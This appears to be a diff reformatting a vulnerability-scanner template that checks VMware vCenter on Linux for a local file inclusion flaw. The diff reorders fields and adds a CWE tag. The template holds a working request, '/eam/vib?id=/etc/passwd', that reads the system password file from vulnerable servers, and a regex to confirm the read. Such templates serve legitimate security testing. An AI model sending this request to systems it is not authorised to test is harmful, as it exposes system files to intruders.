@@ -1,5 +1,4 @@
 id: vmware-vcenter-lfi-linux
-
 info:
   name: Linux Vmware Vcenter - Local File Inclusion
   author: PR3R00T
@@ -8,18 +7,15 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-73
   metadata:
     max-request: 1
-  tags: vmware,lfi,vcenter,linux,vuln
-
+  tags: lfi,linux,vcenter,vmware,vuln
 http:
-  - method: GET
+  - matchers:
+      - regex:
+          - 'root:.*:0:0:'
+        type: regex
+    method: GET
     path:
-      - "{{BaseURL}}/eam/vib?id=/etc/passwd"
-
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-
+      - '{{BaseURL}}/eam/vib?id=/etc/passwd'
